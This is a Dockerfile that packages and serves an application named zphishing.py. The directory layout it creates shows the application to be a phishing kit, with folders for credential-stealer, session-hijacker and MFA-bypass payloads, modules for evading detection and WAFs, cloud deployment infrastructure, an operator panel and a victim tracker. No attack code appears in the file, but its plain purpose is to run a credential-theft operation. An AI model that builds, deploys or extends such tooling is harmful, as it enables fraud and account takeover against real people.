FROM python:3.11-slim

# Install system dependencies
RUN apt-get update && apt-get install -y \
    gcc \
    g++ \
    libffi-dev \
    libssl-dev \
    libxml2-dev \
    libxslt1-dev \
    libjpeg-dev \
    zlib1g-dev \
    libpng-dev \
    tesseract-ocr \
    ffmpeg \
    libsm6 \
    libxext6 \
    libxrender-dev \
    libgl1-mesa-glx \
    libglib2.0-0 \
    chromium \
    && rm -rf /var/lib/apt/lists/*

# Set working directory
WORKDIR /app

# Copy requirements
COPY requirements.txt .

# Install Python dependencies
RUN pip install --no-cache-dir -r requirements.txt

# Install Playwright browsers
RUN playwright install chromium

# Copy application
COPY . .

# Create necessary directories
RUN mkdir -p templates/{social,corporate,custom,ai_generated}
RUN mkdir -p payloads/{credential_stealer,session_hijacker,mfa_bypass,custom}
RUN mkdir -p evasion/{domain_rotation,fingerprint_spoofer,traffic_obfuscator,sandbox_detector,waf_bypass}
RUN mkdir -p infrastructure/{cloud_deployer,docker_manager,kubernetes_orchestrator,ssl_manager}
RUN mkdir -p api/{rest_api,websocket,graphql}
RUN mkdir -p cli/{interactive,commands}
RUN mkdir -p web/{dashboard,operator_panel,victim_tracker}
RUN mkdir -p utils/{logger,config_manager,crypto_utils,helpers}
RUN mkdir -p docs logs data

# Set permissions
RUN chmod +x zphishing.py
RUN chmod +x install.sh

# Expose port
EXPOSE 8080

# Run application
CMD ["python3", "zphishing.py", "serve", "--host", "0.0.0.0", "--port", "8080"]
